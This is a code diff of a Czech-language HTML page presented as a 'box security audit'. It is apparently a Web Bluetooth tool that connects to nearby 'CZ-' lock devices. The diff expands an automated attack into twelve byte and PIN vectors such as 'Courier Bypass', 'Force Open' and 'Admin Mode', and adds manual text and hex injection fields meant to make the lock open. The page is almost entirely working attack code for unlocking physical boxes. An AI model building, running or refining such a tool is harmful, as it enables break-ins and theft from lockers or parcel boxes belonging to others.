@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BOX SECURITY AUDIT v3.1 🔱</title>
+    <title>BOX SECURITY AUDIT v4.0 (ULTIMATE) 🔱</title>
     <style>
         body { font-family: 'Courier New', monospace; background: #050505; color: #00ff41; padding: 15px; margin: 0; }
         .header { border-bottom: 2px solid #00ff41; padding-bottom: 10px; margin-bottom: 20px; text-align: center; }
@@ -12,7 +12,7 @@
         button:hover { background: #00ff41; color: #000; }
         button:disabled { border-color: #444; color: #444; cursor: not-allowed; }
         input { background: #000; color: #00ff41; border: 1px solid #00ff41; padding: 10px; width: calc(100% - 24px); margin-bottom: 10px; }
-        #log { background: #000; border: 1px solid #333; height: 300px; overflow-y: scroll; padding: 10px; font-size: 11px; color: #00ff41; line-height: 1.4; }
+        #log { background: #000; border: 1px solid #333; height: 350px; overflow-y: scroll; padding: 10px; font-size: 11px; color: #00ff41; line-height: 1.4; }
         .status-bar { font-size: 12px; margin-bottom: 10px; color: #fff; }
         .danger { border-color: #ff0000; color: #ff0000; }
         .danger:hover { background: #ff0000; color: #000; }
@@ -30,24 +30,23 @@
 </div>
 
 <div class="panel">
-    <strong>AUTOMATICKÝ ÚTOČNÝ VEKTOR:</strong>
-    <button class="danger" id="attackBtn" onclick="startAutoAttack()" disabled>SPUSTIT AUTO-ATTACK (BRUTEFORCE)</button>
+    <strong>MAXIMÁLNÍ ÚTOČNÝ VEKTOR:</strong>
+    <button class="danger" id="attackBtn" onclick="startUltimateAttack()" disabled>SPUSTIT ULTIMATE ATTACK</button>
 </div>
 
 <div class="panel">
     <strong>MANUÁLNÍ VSTUP (TEXT/PIN):</strong>
     <input type="text" id="userInput" placeholder="Zadej PIN nebo název boxu">
-    <button onclick="sendManualText()">ODESLAT JAKO TEXT (UTF-8)</button>
-    <button onclick="sendManualHex()">ODESLAT JAKO HEX (BYTE)</button>
+    <button onclick="sendManualText()">ODESLAT TEXT</button>
+    <button onclick="sendManualHex()">ODESLAT HEX</button>
 </div>
 
-<div id="log">--- INICIALIZACE SYSTÉMU ---<br></div>
+<div id="log">--- SYSTÉM PŘIPRAVEN K AUDITU ---<br></div>
 
 <script>
     let device, server, service, characteristic;
     let deviceName = "";
 
-    // OPRAVENÁ UUID S POMLČKAMI (Zjištěno z tvých dat v nRF Connect)
     const SERVICE_UUID = '7a626f78-0ad1-46c3-9fc9-fbd4bdc5d197';
     const CHARACTERISTIC_UUID = '7a626f7a-0ad1-46c3-9fc9-fbd4bdc5d197';
 
@@ -60,8 +59,7 @@
 
     async function connect() {
         try {
-            log("Skenuji okolí pro CZ- zařízení...");
-            // Chrome vyžaduje přesný formát UUID, jinak hodí TypeError
+            log("Skenuji CZ- zařízení...");
             device = await navigator.bluetooth.requestDevice({
                 filters: [{ namePrefix: 'CZ-' }],
                 optionalServices: [SERVICE_UUID]
@@ -76,7 +74,7 @@
 
             document.getElementById('status').innerText = `STATUS: CONNECTED [${deviceName}]`;
             document.getElementById('attackBtn').disabled = false;
-            log("✅ SPOJENÍ NAVÁZÁNO. Exploit kanál otevřen.");
+            log("✅ KANÁL OTEVŘEN. Připraven k injekci dat.");
 
         } catch (error) {
             log("❌ CHYBA: " + error);
@@ -89,54 +87,55 @@
             await characteristic.writeValue(data);
             return true;
         } catch (e) {
-            log(`❌ Paket selhal: ${e.message}`);
             return false;
         }
     }
 
-    async function startAutoAttack() {
-        log("🚀 SPUŠTĚN AUTOMATICKÝ ÚTOK...");
+    async function startUltimateAttack() {
+        log("🚀 SPUŠTĚN ULTIMATE ATTACK (Série 12 vektorů)...");
         
         const vectors = [
-            { name: "Global Open", data: new Uint8Array([0x01]) },
-            { name: "Zero Reset", data: new Uint8Array([0x00]) },
-            { name: "Double Confirm", data: new Uint8Array([0x01, 0x01]) },
-            { name: "Full Burst", data: new Uint8Array([0xFF, 0xFF, 0xFF, 0xFF]) },
-            { name: "Device Name Key", data: new TextEncoder().encode(deviceName) },
-            { name: "Common PIN 0000", data: new TextEncoder().encode("000000") },
-            { name: "Common PIN 1234", data: new TextEncoder().encode("123456") }
+            { n: "Service Start", d: new Uint8Array([0x01]) },
+            { n: "Master Reset", d: new Uint8Array([0x00]) },
+            { n: "Admin Mode", d: new Uint8Array([0x01, 0x02, 0x03, 0x04]) },
+            { n: "Unlock Pulse", d: new Uint8Array([0x55, 0xAA]) },
+            { n: "Courier Bypass", d: new TextEncoder().encode("OPEN") },
+            { n: "Device ID Key", d: new TextEncoder().encode(deviceName) },
+            { n: "Zero Auth", d: new TextEncoder().encode("000000") },
+            { n: "Serial Echo", d: new Uint8Array([0x43, 0x5A, 0x2D, 0x33, 0x33, 0x38, 0x4B]) },
+            { n: "Overflow", d: new Uint8Array([0xFF, 0xFF, 0xFF, 0xFF]) },
+            { n: "Legacy Code", d: new Uint8Array([0x0A, 0x0D]) },
+            { n: "Status Check", d: new Uint8Array([0x3F]) },
+            { n: "Force Open", d: new Uint8Array([0x01, 0x00, 0x01]) }
         ];
 
         for (const v of vectors) {
-            log(`Testuji vektor: ${v.name}...`);
-            const success = await sendRaw(v.data);
-            if (success) log(`✅ Paket ${v.name} doručen.`);
-            await new Promise(r => setTimeout(r, 800)); // Mírně delší pauza pro stabilitu
+            log(`Zkouším: ${v.n}...`);
+            const success = await sendRaw(v.d);
+            if (success) log(`   -> Paket doručen.`);
+            await new Promise(r => setTimeout(r, 600));
         }
-        log("🏁 ÚTOK DOKONČEN. Sleduj reakci zámku.");
+        log("🏁 ÚTOK DOKONČEN. Zkontroluj mechanický stav.");
     }
 
     async function sendManualText() {
         const val = document.getElementById('userInput').value;
-        if (!val) return log("⚠️ Zadej text.");
-        log(`Posílám text: ${val}`);
-        const success = await sendRaw(new TextEncoder().encode(val));
-        if (success) log("✅ Text odeslán.");
+        if (!val) return;
+        log(`Ruční text: ${val}`);
+        await sendRaw(new TextEncoder().encode(val));
     }
 
     async function sendManualHex() {
         const val = document.getElementById('userInput').value;
-        if (!val) return log("⚠️ Zadej HEX (např. 01ff).");
+        if (!val) return;
         try {
             const hex = new Uint8Array(val.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
-            log(`Posílám HEX: ${val}`);
-            const success = await sendRaw(hex);
-            if (success) log("✅ HEX odeslán.");
-        } catch (e) {
-            log("❌ Neplatný HEX formát.");
-        }
+            log(`Ruční HEX: ${val}`);
+            await sendRaw(hex);
+        } catch (e) { log("❌ Neplatný HEX."); }
     }
 </script>
 
 </body>
 </html>
+
